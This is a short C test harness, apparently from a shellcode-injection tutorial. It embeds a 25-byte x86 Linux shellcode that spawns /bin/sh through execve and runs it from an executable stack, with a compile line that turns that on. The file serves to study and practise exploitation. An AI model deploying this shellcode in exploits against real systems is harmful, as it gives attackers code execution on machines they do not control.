// gcc -o shell shell.c -m32 -g -z execstack 
// Not needed: -fno-stack-protector -no-pie
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// https://dhavalkapil.com/blogs/Shellcode-Injection/
const char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

int main() {
  void (*foo)() = shellcode;
  foo();
}
